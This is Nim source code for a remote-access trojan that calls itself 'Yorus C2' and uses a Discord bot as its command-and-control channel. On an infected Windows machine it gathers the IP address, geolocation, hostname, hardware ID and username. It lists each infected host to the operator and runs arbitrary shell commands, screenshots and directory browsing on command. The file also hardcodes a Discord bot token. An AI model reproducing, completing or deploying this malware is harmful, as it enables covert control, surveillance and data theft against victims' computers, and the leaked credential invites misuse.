import dimscord, asyncdispatch, options, strutils, strformat, json
import core / [pcinformation, control, sender]

let discord = newDiscordClient("MTEzMDMwMTg3Nzg0MjYyODY4OQ.GM3FZK.IaAhpDp7HAHm9sEkuJDfbfDa9ZSSzRsGl9_v8w")
let prefix = "-"

var
    pcControl = PcControl()
    pcInfor = PcInformation()
    messageSender = Sender()

let 
    # --- IP INFORMATION --- #
    ipData = pcInfor.ipData()
    ip = ipData["ip"]
    hostname = ipData["hostname"]
    city = ipData["city"]
    region = ipData["region"]
    loc = ipData["loc"]
    org = ipData["org"]
    postal = ipData["postal"]
    timezone = ipData["timezone"]
    # --- SYSTEM INFORMATION --- #
    hwid = pcInfor.hwid()
    username = pcInfor.username()


proc onReady(s: Shard, r: Ready) {.event(discord).} =
    echo "Ready as " & $r.user
    await s.updateStatus(activity = some ActivityStatus(
        name: &"Yorus C2 use {prefix}help",
        kind: atPlaying,
    ), status = "dnd")

proc messageCreate(s: Shard, m: Message) {.event(discord).} =
    let args = m.content.split(" ")
    if m.author.bot or not args[0].startsWith(prefix): return
    let command = args[0][1..args[0].high].toLowerAscii()
    var command_arr = args
    

    # --- SET API AND CHANNEL ID --- #
    pcControl.setApi(discord.api)
    pcControl.setChannelId(m.channel_id)

    case command:
    of "help", "list":
        discard
    else:
        let id = 
            try: args[1]
            except: 
                discard await discord.api.sendMessage(
                    m.channel_id,
                    "Please pass in all requirements :rolling_eyes:."
                )
                return
        if id != hwid : return
        command_arr.delete(0)
        command_arr.delete(0)

    # --- OTHER --- #
    case command:
    of "help":
        discard await discord.api.sendMessage(
            m.channel_id, 
            embeds = @[
                    Embed(
                        title: some "Commands",
                        description: some &"**__Commands__**```\nscreenshot, sc, s  [Id] : Screenshot\nshell [Id] : Shell\ncd [Id] : Change Directory\ndir, ls [Id] : List Item in Directoy```",
                        color: some 0x7789ec
                    ),
                    Embed(
                        title: some "Other",
                        description: some &"**__Other__**```\nlist : List all infecter\ngetinfo [Id] : Get Information of infecter```",
                        color: some 0x7789ec
            )]
        )

    of "list":
        let info = &"**__INFORMATION__**```prolog\nIP   : {ip}\nHWID : \"{hwid}\"\n```"
        discard await messageSender.sendOutput(discord.api, m.channel_id, info, false)

    of "getinfo":
        let info = &"**__IP INFORMATION__**```prolog\nIP       : {ip}\nHostName : {hostname}\nCity     : {city}\nRegion   : {region}\nLocation : {loc}\nOrg      : {org}\nPostal   : {postal}\nTimezone : {timezone}\n```"
        discard await messageSender.sendOutput(discord.api, m.channel_id, info, false)

    # --- CONTROLS --- #
    of "screenshot", "sc", "s":
        let savePath = &"C:\\Users\\{username}\\AppData\\Local\\Temp"
        discard await pcControl.screenshot(savePath)

    of "shell":
        let command = join(command_arr, " ")
        discard await pcControl.shell(command)

    of "cd":
        let path = join(command_arr, " ")
        discard await pcControl.cd(path)

    of "dir", "ls":
        discard await pcControl.shell("dir")

    of "taskkill", "tk":
        discard

    of "upload", "up":
        discard

    of "download", "down":
        discard

waitFor discord.startSession(
    gateway_intents = {giGuildMessages, giGuilds, giGuildMembers, giMessageContent}
)